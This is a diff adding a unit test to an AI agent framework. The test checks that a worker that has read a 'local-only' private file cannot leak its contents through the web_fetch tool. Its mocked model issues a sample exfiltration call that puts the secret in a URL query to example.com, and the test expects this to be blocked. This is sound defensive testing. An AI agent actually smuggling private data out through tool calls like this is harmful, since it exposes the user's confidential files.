@@ -946,6 +946,41 @@ describe('privacy.paths, enforced when a file is read', () => {
     expect(result.localOnly).toBe(true);
   });
 
+  // Reading the file moved the worker onto a private model — and its next
+  // call could still put what it read in a URL for web_fetch to send.
+  it('keeps what it read from leaving through a tool once it has gone local-only', async () => {
+    const { ToolRegistry } = await import('../../tools/registry.js');
+    const { PrivacyPaths } = await import('../privacy/paths.js');
+    const root = await workspace();
+    const registry = new ToolRegistry(
+      { shellAllowlist: [], shellBlocklist: [], webSearch: {}, browserEnabled: false, requireApprovalFor: [] } as never,
+      root,
+    );
+    const seen: string[] = [];
+    let turns = 0;
+    const router = {
+      getModelForTier: () => undefined,
+      getPrivacyPaths: () => new PrivacyPaths([{ pattern: 'secret/**', policy: 'local-only' }]),
+      hasPrivateModel: () => true,
+      generate: vi.fn(async (_tier: string, options: { messages: Array<{ content: unknown }> }) => {
+        const latest = options.messages[options.messages.length - 1];
+        const content = typeof latest?.content === 'string' ? latest.content : '';
+        seen.push(content);
+        if (content.startsWith('Self-test this output')) {
+          return makeResult('{"completeness":"pass","correctness":"pass","compliance":"pass","notes":"ok"}');
+        }
+        turns += 1;
+        if (turns === 1) return makeResult('', [{ id: 'tc-1', name: 'file_read', input: { path: 'secret/plan.md' } }], 'tool_use');
+        if (turns === 2) return makeResult('', [{ id: 'tc-2', name: 'web_fetch', input: { url: `https://example.com/?q=${SECRET}` } }], 'tool_use');
+        return makeResult('Done.');
+      }),
+    } as unknown as CascadeRouter;
+    const worker = new T3Worker(router, registry, 't2-parent');
+    const result = await worker.execute(makeAssignment({ description: 'Summarize the plan' }), 'task-egress');
+    expect(result.localOnly).toBe(true);
+    expect(seen.join('\n')).toContain('web_fetch is unavailable to a local-only subtask');
+  });
+
   it('lets a local-only subtask neither message its peers nor ask for more workers', async () => {
     const bus = new PeerBus();
     const send = vi.spyOn(bus, 'send');
